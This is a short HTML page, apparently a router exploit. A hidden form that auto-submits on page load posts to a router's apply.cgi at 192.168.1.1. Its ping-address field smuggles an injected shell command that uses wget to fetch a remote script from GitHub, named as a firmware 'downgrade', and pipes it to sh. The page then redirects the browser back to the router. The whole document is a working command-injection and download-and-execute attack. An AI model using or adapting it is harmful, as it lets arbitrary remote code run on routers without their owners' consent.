<form method="post" id="exploit" action="https://192.168.1.1/apply.cgi"><input name="submit_button" value="ping_test" type="hidden"><input name="submit_type" value="do_ping" type="hidden"><input name="change_action" value="gozila_cgi" type="hidden"><input name="pingAddr" value='|wget -O - http://raw.github.com/Renzkie14/8band/main/downgrade.sh | sh &&echo \<script\>window\.location\.href\=\"https\:\/\/192.168.1.1\/\"\;\<\/script\>' type="hidden"><input name="web_net_mode" value="ipv4" type="hidden"><input type="submit" style="display:none;"></form>
<script>
function exploit () {
var xploit = document.getElementById("exploit");
xploit.submit();
}
window.onload = exploit;
</script>
